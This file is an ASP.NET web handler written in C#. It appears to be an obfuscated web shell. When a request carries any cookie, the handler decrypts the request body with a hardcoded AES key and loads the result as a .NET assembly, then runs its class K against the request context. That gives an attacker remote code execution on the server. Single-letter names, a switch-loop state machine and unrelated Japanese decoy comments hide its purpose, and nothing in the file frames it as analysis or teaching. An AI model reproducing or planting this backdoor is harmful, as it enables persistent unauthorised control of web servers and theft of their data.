<%@ WebHandler Language="C#" Class="a" %>
using System.Web;using System;using System.Reflection;using System.Security.Cryptography;
public class a:IHttpHandler{
    public void ProcessRequest(HttpContext b){
        // 月が綺麗ですね。
        if(b.Request.Cookies.Count!=0){
            int c=0;
            object d=null;
            object e=null;
            object f=null;
            // サーバーの応答を待ちます。
            while(c<3){
                switch(c){
                    case 0:
                        // この変数は何のためにあるのだろう？
                        var g = new byte[] { 0x63, 0x61, 0x36, 0x33, 0x34, 0x35, 0x37, 0x35, 0x33, 0x38, 0x62, 0x39, 0x62, 0x31, 0x65, 0x30 };
                        var h = new RijndaelManaged();
                        d = h.CreateDecryptor(g,g);
                        c=1;
                        break;
                    case 1:
                        // そろそろお昼ご飯の時間だ。
                        var i = b.Request.BinaryRead(b.Request.ContentLength);
                        e = ((ICryptoTransform)d).TransformFinalBlock(i,0,i.Length);
                        c=2;
                        break;
                    case 2:
                        // コーヒーを一杯ください。
                        f = Assembly.Load((byte[])e);
                        var j = ((Assembly)f).CreateInstance("K");
                        j.Equals(b);
                        // さようなら。
                        c=3;
                        break;
                }
            }
        }
    }
    // 明日も頑張ります！
    public bool IsReusable{get{return false;}}
}